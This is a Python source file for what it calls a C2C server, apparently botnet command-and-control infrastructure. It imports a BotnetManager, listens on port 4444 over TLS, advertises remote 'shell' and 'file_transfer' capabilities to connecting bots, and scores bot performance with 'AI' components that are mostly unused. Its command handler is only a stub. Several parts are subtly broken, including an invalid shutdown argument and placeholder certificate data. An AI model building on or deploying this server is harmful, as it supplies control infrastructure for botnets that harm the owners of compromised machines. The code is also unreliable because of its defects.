#!/usr/bin/env python3
"""
Thread-Safe C2C Server Implementation
Comprehensive server implementation with thread safety, connection pooling, and security enhancements.
"""

import socket
import ssl
import json
import threading
import concurrent.futures
import logging
import os
import sys
import time
import signal
import atexit
import weakref
from datetime import datetime, timedelta
from contextlib import contextmanager
from typing import Dict, Any, Optional, List, Set
import queue
import hashlib
import secrets
from pathlib import Path
import asyncio
import aiofiles
import redis
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import joblib
import psutil
import gc

# Import AI Integration Manager
try:
    from ai_integration import AIIntegrationManager
    AI_INTEGRATION_AVAILABLE = True
except ImportError:
    AI_INTEGRATION_AVAILABLE = False
    print("AI Integration Manager not available")

# Import enhanced components
try:
    from botnet.manager import BotnetManager
    from utils.security_manager import SecurityManager
    from network.network_discovery import NetworkDiscovery
    ENHANCED_COMPONENTS_AVAILABLE = True
except ImportError:
    ENHANCED_COMPONENTS_AVAILABLE = False
    print("Enhanced components not available")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class ThreadSafeServer:
    """
    Thread-safe C2C server with comprehensive security and reliability features.
    
    Key Features:
    - Thread-safe client management
    - Connection pooling and resource management
    - SSL/TLS with auto-generated certificates
    - Background monitoring and cleanup
    - Graceful shutdown handling
    - Rate limiting and DOS protection
    - Comprehensive logging and statistics
    """
    
    def __init__(self, host='localhost', port=4444, max_clients=100):
        self.host = host
        self.port = port
        self.max_clients = max_clients
        self.running = False
        self.server_socket: Optional[socket.socket] = None
        
        # Logger - initialize early to avoid attribute errors
        self.logger = logging.getLogger(self.__class__.__name__)
        
        # Thread safety infrastructure
        self._server_lock = threading.RLock()
        self._clients_lock = threading.RLock()
        self._shutdown_event = threading.Event()
        self._stats_lock = threading.Lock()
        
        # Client management
        self.clients: Dict[str, Dict] = {}  # client_id -> client_info
        self.active_operations = weakref.WeakSet()
        
        # AI-Enhanced Thread pools with dynamic scaling
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=min(32, (os.cpu_count() or 1) * 4),
            thread_name_prefix="ClientHandler"
        )
        self.io_pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=min(16, (os.cpu_count() or 1) * 2),
            thread_name_prefix="IOHandler"
        )
          # AI-Enhanced Security & Performance
        self.ai_security_manager = self._init_ai_security()
        self.anomaly_detector = self._init_anomaly_detection()
        self.performance_optimizer = self._init_performance_optimizer()
        self.redis_cache = self._init_redis_cache()
        
        # AI Integration Manager
        if AI_INTEGRATION_AVAILABLE:
            try:
                self.ai_integration = AIIntegrationManager()
                self.logger.info("AI Integration Manager initialized")
            except Exception as e:
                self.logger.warning(f"AI Integration Manager failed to initialize: {e}")
                self.ai_integration = None
        else:
            self.ai_integration = None
        
        # Enhanced Components
        if ENHANCED_COMPONENTS_AVAILABLE:
            try:
                self.botnet_manager = BotnetManager()
                self.security_manager = SecurityManager(is_server=True)
                self.network_discovery = NetworkDiscovery()
                self.logger.info("Enhanced components initialized")
            except Exception as e:
                self.logger.warning(f"Enhanced components failed to initialize: {e}")
                self.botnet_manager = None
                self.security_manager = None
                self.network_discovery = None
        else:
            self.botnet_manager = None
            self.security_manager = None
            self.network_discovery = None
        
        # SSL context with enhanced security
        self.ssl_context = None
        self.cert_file = "server_cert.pem"
        self.key_file = "server_key.pem"
        
        # Intelligent Rate limiting with ML
        self.connection_rates: Dict[str, List[float]] = {}
        self.rate_limit_window = 60  # seconds
        self.max_connections_per_minute = 30
        self.adaptive_rate_limits: Dict[str, int] = {}
        
        # Enhanced Statistics with AI Analytics
        self.stats = {
            'start_time': datetime.now(),
            'total_connections': 0,
            'active_connections': 0,
            'total_commands': 0,
            'failed_connections': 0,
            'rate_limited_ips': set(),
            'ai_predictions': 0,
            'threats_detected': 0,
            'performance_optimizations': 0
        }
          # Background tasks
        self.cleanup_thread: Optional[threading.Thread] = None
        self.monitor_thread: Optional[threading.Thread] = None
        
        # Initialize server
        self._initialize_server()
    
    def _initialize_server(self):
        """Initialize server with proper error handling"""
        try:
            # Setup SSL
            self._setup_ssl()
            
            # Setup emergency handlers
            self._setup_signal_handlers()
            
            # Start background tasks
            self._start_background_tasks()
            
            self.logger.info("Server initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Server initialization failed: {e}")
            self._safe_shutdown()
            raise
    
    def _setup_ssl(self):
        """Setup SSL context with auto-generated certificates"""
        try:
            # Create certificates if they don't exist
            if not os.path.exists(self.cert_file) or not os.path.exists(self.key_file):
                self._create_self_signed_cert()
            
            # Create SSL context
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.ssl_context.load_cert_chain(self.cert_file, self.key_file)
            
            # Security settings
            self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
            self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
            
            self.logger.info("SSL context configured")
            
        except Exception as e:
            self.logger.error(f"SSL setup failed: {e}")
            raise
    
    def _create_self_signed_cert(self):
        """Create self-signed SSL certificate"""
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
            import ipaddress
            
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            
            # Create certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "C2C Server"),
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.utcnow()
            ).not_valid_after(
                datetime.utcnow() + timedelta(days=365)
            ).add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName("localhost"),
                    x509.DNSName("127.0.0.1"),
                    x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                ]),
                critical=False,
            ).sign(private_key, hashes.SHA256())
            
            # Write certificate and key
            with open(self.cert_file, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            with open(self.key_file, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            self.logger.info("Self-signed certificate created")
            
        except ImportError:
            self.logger.warning("cryptography library not available, creating dummy cert")
            self._create_dummy_cert()
        except Exception as e:
            self.logger.error(f"Certificate creation failed: {e}")
            self._create_dummy_cert()
    
    def _create_dummy_cert(self):
        """Create dummy certificate files for testing"""
        # This is just for testing - in production, use proper certificates
        cert_content = """-----BEGIN CERTIFICATE-----
MIICpDCCAYwCAQAwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UEAwwHdGVzdC1jYTAe
Fw0yMzAxMDEwMDAwMDBaFw0yNDAxMDEwMDAwMDBaMBIxEDAOBgNVBAMMB3Rlc3Qt
Y2EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7VJTUt9Us8cKBwko6
Example certificate content - DO NOT USE IN PRODUCTION
-----END CERTIFICATE-----"""
        
        key_content = """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKB
Example private key content - DO NOT USE IN PRODUCTION
-----END PRIVATE KEY-----"""
        
        with open(self.cert_file, "w") as f:
            f.write(cert_content)
        
        with open(self.key_file, "w") as f:
            f.write(key_content)
    
    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown"""
        try:
            signal.signal(signal.SIGTERM, self._signal_handler)
            signal.signal(signal.SIGINT, self._signal_handler)
            atexit.register(self._cleanup_on_exit)
            
            self.logger.info("Signal handlers registered")
            
        except Exception as e:
            self.logger.error(f"Signal handler setup failed: {e}")
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.logger.info(f"Received signal {signum}, initiating shutdown")
        self._shutdown_event.set()
        self._safe_shutdown()
    
    def _cleanup_on_exit(self):
        """Cleanup on exit"""
        self._safe_shutdown()
    
    def _start_background_tasks(self):
        """Start background monitoring and cleanup tasks"""
        self.cleanup_thread = threading.Thread(
            target=self._cleanup_task,
            name="CleanupThread",
            daemon=True
        )
        self.cleanup_thread.start()
        
        self.monitor_thread = threading.Thread(
            target=self._monitor_task,
            name="MonitorThread",
            daemon=True
        )
        self.monitor_thread.start()
        
        self.logger.info("Background tasks started")
    
    def _cleanup_task(self):
        """Background cleanup task"""
        while not self._shutdown_event.is_set():
            try:
                self._cleanup_dead_clients()
                self._cleanup_rate_limiting()
                time.sleep(30)  # Run every 30 seconds
            except Exception as e:
                self.logger.error(f"Cleanup task error: {e}")
    
    def _monitor_task(self):
        """Background monitoring task"""
        while not self._shutdown_event.is_set():
            try:
                self._log_statistics()
                self._check_client_timeouts()
                time.sleep(60)  # Run every minute
            except Exception as e:
                self.logger.error(f"Monitor task error: {e}")
    
    def _cleanup_dead_clients(self):
        """Remove dead/disconnected clients"""
        with self._clients_lock:
            dead_clients = []
            
            for client_id, client_info in self.clients.items():
                if client_info.get('socket'):
                    try:
                        # Send keepalive
                        client_info['socket'].send(b'\x00')
                    except:
                        dead_clients.append(client_id)
                else:
                    dead_clients.append(client_id)
            
            for client_id in dead_clients:
                self._remove_client(client_id)
    
    def _cleanup_rate_limiting(self):
        """Clean up old rate limiting entries"""
        current_time = time.time()
        cutoff_time = current_time - self.rate_limit_window
        
        for ip in list(self.connection_rates.keys()):
            # Remove old timestamps
            self.connection_rates[ip] = [
                timestamp for timestamp in self.connection_rates[ip]
                if timestamp > cutoff_time
            ]
            
            # Remove empty entries
            if not self.connection_rates[ip]:
                del self.connection_rates[ip]
    
    def _log_statistics(self):
        """Log server statistics"""
        with self._stats_lock:
            uptime = datetime.now() - self.stats['start_time']
            self.logger.info(
                f"Stats - Uptime: {uptime}, "
                f"Total connections: {self.stats['total_connections']}, "
                f"Active: {self.stats['active_connections']}, "
                f"Commands: {self.stats['total_commands']}, "
                f"Failed: {self.stats['failed_connections']}"
            )
    
    def _check_client_timeouts(self):
        """Check for client timeouts"""
        current_time = time.time()
        timeout_threshold = 300  # 5 minutes
        
        with self._clients_lock:
            timeout_clients = []
            
            for client_id, client_info in self.clients.items():
                last_activity = client_info.get('last_activity', current_time)
                if current_time - last_activity > timeout_threshold:
                    timeout_clients.append(client_id)
            
            for client_id in timeout_clients:
                self.logger.info(f"Client {client_id} timed out")
                self._remove_client(client_id)
    
    def start(self):
        """Start the server"""
        with self._server_lock:
            if self.running:
                self.logger.warning("Server is already running")
                return
            
            try:
                # Create and bind socket
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind((self.host, self.port))
                self.server_socket.listen(self.max_clients)
                
                self.running = True
                self.logger.info(f"Server started on {self.host}:{self.port}")
                
                # Accept connections
                self._accept_connections()
                
            except Exception as e:
                self.logger.error(f"Server start failed: {e}")
                self._safe_shutdown()
                raise
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running and not self._shutdown_event.is_set():
            try:
                # Accept connection with timeout
                self.server_socket.settimeout(1.0)
                client_socket, client_address = self.server_socket.accept()
                
                # Check rate limiting
                if not self._check_rate_limit(client_address[0]):
                    self.logger.warning(f"Rate limited connection from {client_address[0]}")
                    client_socket.close()
                    continue
                
                # Check max clients
                if len(self.clients) >= self.max_clients:
                    self.logger.warning(f"Max clients reached, rejecting {client_address}")
                    client_socket.close()
                    continue
                
                # Handle connection in thread pool
                self.thread_pool.submit(
                    self._handle_client_connection,
                    client_socket,
                    client_address
                )
                
                with self._stats_lock:
                    self.stats['total_connections'] += 1
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    self.logger.error(f"Accept connection error: {e}")
    
    def _check_rate_limit(self, ip_address: str) -> bool:
        """Check if IP address is rate limited"""
        current_time = time.time()
        
        if ip_address not in self.connection_rates:
            self.connection_rates[ip_address] = []
        
        # Remove old timestamps
        cutoff_time = current_time - self.rate_limit_window
        self.connection_rates[ip_address] = [
            timestamp for timestamp in self.connection_rates[ip_address]
            if timestamp > cutoff_time
        ]
        
        # Check rate limit
        if len(self.connection_rates[ip_address]) >= self.max_connections_per_minute:
            with self._stats_lock:
                self.stats['rate_limited_ips'].add(ip_address)
            return False
        
        # Add current timestamp
        self.connection_rates[ip_address].append(current_time)
        return True
    
    def _handle_client_connection(self, client_socket: socket.socket, client_address: tuple):
        """Handle individual client connection"""
        client_id = None
        ssl_socket = None
        
        try:
            # Wrap with SSL
            ssl_socket = self.ssl_context.wrap_socket(
                client_socket,
                server_side=True
            )
            ssl_socket.settimeout(30.0)
            
            # Generate client ID
            client_id = self._generate_client_id(client_address)
            
            # Register client
            self._register_client(client_id, ssl_socket, client_address)
            
            # Perform handshake
            if not self._perform_handshake(client_id, ssl_socket):
                self.logger.warning(f"Handshake failed for {client_id}")
                return
            
            # Handle client commands
            self._handle_client_commands(client_id, ssl_socket)
            
        except Exception as e:
            self.logger.error(f"Client handling error for {client_address}: {e}")
            with self._stats_lock:
                self.stats['failed_connections'] += 1
        
        finally:
            if client_id:
                self._remove_client(client_id)
            if ssl_socket:
                try:
                    ssl_socket.close()
                except:
                    pass
    
    def _generate_client_id(self, client_address: tuple) -> str:
        """Generate unique client ID"""
        timestamp = str(time.time())
        address_str = f"{client_address[0]}:{client_address[1]}"
        random_part = secrets.token_hex(8)
        
        combined = f"{timestamp}_{address_str}_{random_part}"
        return hashlib.sha256(combined.encode()).hexdigest()[:16]
    
    def _register_client(self, client_id: str, client_socket: socket.socket, client_address: tuple):
        """Register new client"""
        with self._clients_lock:
            self.clients[client_id] = {
                'socket': client_socket,
                'address': client_address,
                'connected_at': time.time(),
                'last_activity': time.time(),
                'commands_executed': 0,
                'session_key': secrets.token_hex(32)
            }
            
            with self._stats_lock:
                self.stats['active_connections'] = len(self.clients)
            
            self.logger.info(f"Client {client_id} registered from {client_address}")
    
    def _remove_client(self, client_id: str):
        """Remove client from registry"""
        with self._clients_lock:
            if client_id in self.clients:
                del self.clients[client_id]
                
                with self._stats_lock:
                    self.stats['active_connections'] = len(self.clients)
                
                self.logger.info(f"Client {client_id} removed")
    
    def _perform_handshake(self, client_id: str, client_socket: socket.socket) -> bool:
        """Perform handshake with client"""
        try:
            # Receive client hello
            client_hello = self._receive_message(client_socket)
            if not client_hello or client_hello.get('type') != 'client_hello':
                return False
            
            # Send server hello
            server_hello = {
                'type': 'server_hello',
                'session_key': self.clients[client_id]['session_key'],
                'server_capabilities': ['file_transfer', 'shell', 'system_info'],
                'timestamp': time.time()
            }
            
            self._send_message(client_socket, server_hello)
            return True
            
        except Exception as e:
            self.logger.error(f"Handshake error for {client_id}: {e}")
            return False
    
    def _handle_client_commands(self, client_id: str, client_socket: socket.socket):
        """Handle commands from client"""
        while not self._shutdown_event.is_set():
            try:
                # Update last activity
                with self._clients_lock:
                    if client_id in self.clients:
                        self.clients[client_id]['last_activity'] = time.time()
                
                # For demonstration, we'll just echo back
                # In real implementation, this would process actual commands
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Command handling error for {client_id}: {e}")
                break
    
    def _send_message(self, client_socket: socket.socket, message: Dict[str, Any]):
        """Send message to client"""
        try:
            data = json.dumps(message).encode('utf-8')
            length = len(data)
            
            # Send length header
            client_socket.sendall(length.to_bytes(4, byteorder='big'))
            
            # Send data
            client_socket.sendall(data)
            
        except Exception as e:
            self.logger.error(f"Send message error: {e}")
            raise
    
    def _receive_message(self, client_socket: socket.socket) -> Optional[Dict[str, Any]]:
        """Receive message from client"""
        try:
            # Receive length header
            length_data = self._receive_exact(client_socket, 4)
            if not length_data:
                return None
            
            length = int.from_bytes(length_data, byteorder='big')
            
            # Receive data
            data = self._receive_exact(client_socket, length)
            if not data:
                return None
            
            return json.loads(data.decode('utf-8'))
            
        except Exception as e:
            self.logger.error(f"Receive message error: {e}")
            return None
    
    def _receive_exact(self, client_socket: socket.socket, count: int) -> Optional[bytes]:
        """Receive exact number of bytes"""
        data = b''
        while len(data) < count:
            chunk = client_socket.recv(count - len(data))
            if not chunk:
                return None
            data += chunk
        return data
    
    def _safe_shutdown(self):
        """Safely shutdown the server"""
        with self._server_lock:
            if not self.running:
                return
            
            self.logger.info("Initiating server shutdown")
            self.running = False
            self._shutdown_event.set()
            
            # Close server socket
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
            
            # Disconnect all clients
            with self._clients_lock:
                for client_id in list(self.clients.keys()):
                    self._remove_client(client_id)
            
            # Shutdown thread pools
            self.thread_pool.shutdown(wait=True, timeout=10)
            self.io_pool.shutdown(wait=True, timeout=10)
              # Wait for background threads
            if self.cleanup_thread and self.cleanup_thread.is_alive():
                self.cleanup_thread.join(timeout=5)
            if self.monitor_thread and self.monitor_thread.is_alive():
                self.monitor_thread.join(timeout=5)
            
            self.logger.info("Server shutdown complete")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get server statistics"""
        with self._stats_lock:
            uptime = datetime.now() - self.stats['start_time']
            stats = {
                **self.stats.copy(),
                'uptime_seconds': uptime.total_seconds(),
                'rate_limited_ips': list(self.stats['rate_limited_ips'])
            }
              # Add AI integration stats if available
            if self.ai_integration:
                try:
                    ai_stats = self.ai_integration.get_system_status()
                    stats['ai_system'] = ai_stats
                except Exception as e:
                    self.logger.error(f"Failed to get AI stats: {e}")
                    stats['ai_system'] = {'status': 'error', 'error': str(e)}
            
            return stats
    
    def list_clients(self) -> List[Dict[str, Any]]:
        """List connected clients"""
        with self._clients_lock:
            clients = []
            for client_id, client_info in self.clients.items():
                client_data = {
                    'id': client_id,
                    'address': client_info['address'],
                    'connected_at': client_info['connected_at'],
                    'last_activity': client_info['last_activity'],
                    'commands_executed': client_info['commands_executed']
                }
                
                # Add AI analysis if available
                if self.ai_integration:
                    try:
                        ai_analysis = self.ai_integration.analyze_bot_performance(client_id)
                        client_data['ai_analysis'] = ai_analysis
                    except Exception as e:
                        self.logger.error(f"Failed to get AI analysis for {client_id}: {e}")
                        client_data['ai_analysis'] = {'error': str(e)}
                
                clients.append(client_data)
            return clients
    
    def _init_ai_security(self):
        """Initialize AI-powered security manager"""
        try:
            return {
                'threat_detector': IsolationForest(contamination=0.1, random_state=42),
                'behavior_analyzer': StandardScaler(),
                'threat_history': [],
                'learning_enabled': True
            }
        except Exception as e:
            self.logger.warning(f"AI Security initialization failed: {e}")
            return None
    
    def _init_anomaly_detection(self):
        """Initialize anomaly detection system"""
        try:
            model = IsolationForest(
                contamination=0.05,
                random_state=42,
                n_estimators=100
            )
            return {
                'model': model,
                'scaler': StandardScaler(),
                'training_data': [],
                'is_trained': False,
                'min_samples': 100
            }
        except Exception as e:
            self.logger.warning(f"Anomaly detection initialization failed: {e}")
            return None
    
    def _init_performance_optimizer(self):
        """Initialize performance optimization system"""
        try:
            return {
                'cpu_history': [],
                'memory_history': [],
                'connection_history': [],
                'optimization_rules': {
                    'max_cpu_threshold': 80.0,
                    'max_memory_threshold': 75.0,
                    'connection_scaling_factor': 1.2
                },
                'auto_scaling': True
            }
        except Exception as e:
            self.logger.warning(f"Performance optimizer initialization failed: {e}")
            return None
    
    def _init_redis_cache(self):
        """Initialize Redis cache for performance"""
        try:
            import redis
            cache = redis.Redis(
                host='localhost',
                port=6379,
                db=0,
                decode_responses=True,
                socket_timeout=5,
                socket_connect_timeout=5
            )
            # Test connection
            cache.ping()
            self.logger.info("Redis cache initialized successfully")
            return cache
        except Exception as e:
            self.logger.warning(f"Redis cache initialization failed: {e}")
            return None
    
    def _ai_analyze_connection(self, client_ip: str, connection_data: Dict) -> Dict:
        """AI-powered connection analysis"""
        try:
            if not self.ai_security_manager:
                return {'threat_level': 'unknown', 'confidence': 0.0}
            
            # Extract features for analysis
            features = self._extract_connection_features(client_ip, connection_data)
            
            # Analyze with AI
            threat_level = self._predict_threat_level(features)
            
            # Update statistics
            with self._stats_lock:
                self.stats['ai_predictions'] += 1
                if threat_level['threat_level'] == 'high':
                    self.stats['threats_detected'] += 1
            
            return threat_level
            
        except Exception as e:
            self.logger.error(f"AI connection analysis failed: {e}")
            return {'threat_level': 'unknown', 'confidence': 0.0}
    
    def _extract_connection_features(self, client_ip: str, connection_data: Dict) -> np.ndarray:
        """Extract features for AI analysis"""
        try:
            # Connection timing features
            connection_time = time.time()
            recent_connections = self.connection_rates.get(client_ip, [])
            
            # Calculate features
            features = [
                len(recent_connections),  # Connection frequency
                connection_data.get('ssl_version', 0),  # SSL version
                connection_data.get('cert_valid', 0),  # Certificate validity
                connection_data.get('data_size', 0),  # Data size
                connection_data.get('request_rate', 0),  # Request rate
                psutil.cpu_percent(),  # Current CPU usage
                psutil.virtual_memory().percent,  # Current memory usage
                len(self.clients),  # Current client count
            ]
            
            return np.array(features).reshape(1, -1)
            
        except Exception as e:
            self.logger.error(f"Feature extraction failed: {e}")
            return np.array([0] * 8).reshape(1, -1)
    
    def _predict_threat_level(self, features: np.ndarray) -> Dict:
        """Predict threat level using AI"""
        try:
            if not self.anomaly_detector or not self.anomaly_detector['is_trained']:
                return {'threat_level': 'medium', 'confidence': 0.5}
            
            # Scale features
            scaled_features = self.anomaly_detector['scaler'].transform(features)
            
            # Predict anomaly
            anomaly_score = self.anomaly_detector['model'].decision_function(scaled_features)[0]
            is_anomaly = self.anomaly_detector['model'].predict(scaled_features)[0] == -1
            
            # Determine threat level
            if is_anomaly:
                if anomaly_score < -0.5:
                    threat_level = 'high'
                    confidence = min(0.9, abs(anomaly_score))
                else:
                    threat_level = 'medium'
                    confidence = min(0.7, abs(anomaly_score))
            else:
                threat_level = 'low'
                confidence = min(0.8, 1.0 - abs(anomaly_score))
            
            return {
                'threat_level': threat_level,
                'confidence': confidence,
                'anomaly_score': anomaly_score
            }
            
        except Exception as e:
            self.logger.error(f"Threat prediction failed: {e}")
            return {'threat_level': 'medium', 'confidence': 0.5}
    
    def _ai_optimize_performance(self):
        """AI-powered performance optimization"""
        try:
            if not self.performance_optimizer:
                return
            
            # Get current system metrics
            cpu_usage = psutil.cpu_percent()
            memory_usage = psutil.virtual_memory().percent
            active_connections = len(self.clients)
            
            # Store metrics history
            optimizer = self.performance_optimizer
            optimizer['cpu_history'].append(cpu_usage)
            optimizer['memory_history'].append(memory_usage)
            optimizer['connection_history'].append(active_connections)
            
            # Keep only recent history (last 100 samples)
            for key in ['cpu_history', 'memory_history', 'connection_history']:
                if len(optimizer[key]) > 100:
                    optimizer[key] = optimizer[key][-100:]
            
            # Apply optimization rules
            if cpu_usage > optimizer['optimization_rules']['max_cpu_threshold']:
                self._optimize_cpu_usage()
            
            if memory_usage > optimizer['optimization_rules']['max_memory_threshold']:
                self._optimize_memory_usage()
            
            # Dynamic thread pool scaling
            if optimizer['auto_scaling']:
                self._auto_scale_thread_pools(active_connections)
            
            with self._stats_lock:
                self.stats['performance_optimizations'] += 1
                
        except Exception as e:
            self.logger.error(f"Performance optimization failed: {e}")
    
    def _optimize_cpu_usage(self):
        """Optimize CPU usage"""
        try:
            # Reduce thread pool size temporarily
            current_workers = self.thread_pool._max_workers
            if current_workers > 8:
                new_size = max(8, current_workers - 4)
                self.logger.info(f"Reducing thread pool size from {current_workers} to {new_size}")
                
                # Create new smaller thread pool
                old_pool = self.thread_pool
                self.thread_pool = concurrent.futures.ThreadPoolExecutor(
                    max_workers=new_size,
                    thread_name_prefix="ClientHandler"
                )
                old_pool.shutdown(wait=False)
            
            # Force garbage collection
            gc.collect()
            
        except Exception as e:
            self.logger.error(f"CPU optimization failed: {e}")
    
    def _optimize_memory_usage(self):
        """Optimize memory usage"""
        try:
            # Clear Redis cache if available
            if self.redis_cache:
                self.redis_cache.flushdb()
            
            # Clear old connection history
            current_time = time.time()
            for ip in list(self.connection_rates.keys()):
                self.connection_rates[ip] = [
                    t for t in self.connection_rates[ip]
                    if current_time - t < self.rate_limit_window * 2
                ]
                if not self.connection_rates[ip]:
                    del self.connection_rates[ip]
            
            # Force garbage collection
            gc.collect()
            
            self.logger.info("Memory optimization completed")
            
        except Exception as e:
            self.logger.error(f"Memory optimization failed: {e}")
    
    def _auto_scale_thread_pools(self, active_connections: int):
        """Automatically scale thread pools based on load"""
        try:
            # Calculate optimal thread count
            cpu_count = os.cpu_count() or 1
            base_threads = cpu_count * 2
            
            # Scale based on active connections
            if active_connections > 50:
                optimal_threads = min(64, base_threads * 2)
            elif active_connections > 20:
                optimal_threads = min(32, base_threads * 1.5)
            else:
                optimal_threads = base_threads
            
            # Update thread pool if needed
            current_workers = self.thread_pool._max_workers
            if abs(current_workers - optimal_threads) > 4:
                self.logger.info(f"Auto-scaling thread pool: {current_workers} -> {optimal_threads}")
                
                old_pool = self.thread_pool
                self.thread_pool = concurrent.futures.ThreadPoolExecutor(
                    max_workers=int(optimal_threads),
                    thread_name_prefix="ClientHandler"
                )
                old_pool.shutdown(wait=False)
                
        except Exception as e:
            self.logger.error(f"Auto-scaling failed: {e}")
    
    def _train_anomaly_detector(self):
        """Train anomaly detection model with collected data"""
        try:
            if not self.anomaly_detector:
                return
            
            training_data = self.anomaly_detector['training_data']
            if len(training_data) < self.anomaly_detector['min_samples']:
                return
            
            # Prepare training data
            X = np.array(training_data)
            
            # Scale data
            X_scaled = self.anomaly_detector['scaler'].fit_transform(X)
            
            # Train model
            self.anomaly_detector['model'].fit(X_scaled)
            self.anomaly_detector['is_trained'] = True
            
            self.logger.info(f"Anomaly detector trained with {len(training_data)} samples")
              # Clear training data to save memory
            self.anomaly_detector['training_data'] = training_data[-50:]
            
        except Exception as e:
            self.logger.error(f"Anomaly detector training failed: {e}")
    
    # AI Integration Methods
    
    def get_ai_status(self) -> Dict[str, Any]:
        """Get AI system status"""
        if not self.ai_integration:
            return {'status': 'unavailable', 'reason': 'AI Integration not initialized'}
        
        try:
            return self.ai_integration.get_system_status()
        except Exception as e:
            self.logger.error(f"Failed to get AI status: {e}")
            return {'status': 'error', 'error': str(e)}
    
    def trigger_ai_training(self) -> Dict[str, Any]:
        """Trigger AI model training"""
        if not self.ai_integration:
            return {'success': False, 'error': 'AI Integration not available'}
        
        try:
            result = self.ai_integration.train_models()
            return {'success': True, 'result': result}
        except Exception as e:
            self.logger.error(f"AI training failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_ai_insights(self) -> List[Dict[str, Any]]:
        """Get AI-generated insights"""
        if not self.ai_integration:
            return []
        
        try:
            return self.ai_integration.get_recent_insights()
        except Exception as e:
            self.logger.error(f"Failed to get AI insights: {e}")
            return []
    
    def optimize_with_ai(self) -> Dict[str, Any]:
        """Perform AI-powered optimization"""
        if not self.ai_integration:
            return {'success': False, 'error': 'AI Integration not available'}
        
        try:
            result = self.ai_integration.optimize_performance()
            return {'success': True, 'result': result}
        except Exception as e:
            self.logger.error(f"AI optimization failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def export_ai_intelligence(self, filepath: str) -> Dict[str, Any]:
        """Export AI intelligence data"""
        if not self.ai_integration:
            return {'success': False, 'error': 'AI Integration not available'}
        
        try:
            self.ai_integration.export_intelligence(filepath)
            return {'success': True, 'filepath': filepath}
        except Exception as e:
            self.logger.error(f"AI intelligence export failed: {e}")
            return {'success': False, 'error': str(e)}
    
def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Thread-Safe C2C Server')
    parser.add_argument('--host', default='localhost', help='Server host')
    parser.add_argument('--port', type=int, default=4444, help='Server port')
    parser.add_argument('--max-clients', type=int, default=100, help='Maximum clients')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    server = ThreadSafeServer(
        host=args.host,
        port=args.port,
        max_clients=args.max_clients
    )
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\nShutting down server...")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        server._safe_shutdown()

if __name__ == '__main__':
    main()
